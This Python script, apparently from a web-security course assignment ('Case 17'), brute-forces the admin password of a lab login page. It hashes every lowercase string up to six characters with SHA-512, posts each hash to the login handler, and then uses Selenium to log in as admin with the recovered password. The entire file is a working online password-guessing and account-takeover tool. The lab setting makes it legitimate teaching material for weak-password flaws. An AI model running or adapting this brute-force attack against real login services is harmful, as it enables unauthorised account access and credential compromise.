import hashlib
import string
import urllib
import urllib2
from itertools import product
from selenium import webdriver

# Case 17: Password Management (Low password complexity)

url = 'http://www.wsb.com/Assignment2/case17/includes/process_login.php'
admin_email = 'admin@admin.com'


def test_password(password):
    p = hashlib.sha512(password).hexdigest()
    payload = urllib.urlencode({'email': admin_email,
                                'p': p})
    req = urllib2.Request(url, payload)
    rsp = urllib2.urlopen(req)
    rsp_url = rsp.geturl()
    if 'error' in rsp_url or rsp.read() == 'Invalid Request':
        return False
    return True


letters = string.ascii_lowercase  # hdls
found = False
adminpw = None

count = 0
# Bruteforce
for length in range(1, 7):
    tests = product(letters, repeat=length)
    for test in tests:
        if test_password(''.join(test)):
            found = True
            adminpw = ''.join(test)
            break

    if found:
        break
    print('length done: ' + str(length))

if not adminpw:
    print("Failed at bruteforcing")
    exit(-1)

print("The admin password is:")
print(adminpw)

driver = webdriver.Firefox()
driver.get("http://www.wsb.com/Assignment2/case17/login.php")
login_email = driver.find_element_by_name('email')
login_password = driver.find_element_by_id('password')
login_email.send_keys(admin_email)
login_password.send_keys(adminpw)
login_attempt = driver.find_element_by_xpath("//*[@type='button']")
login_attempt.click()
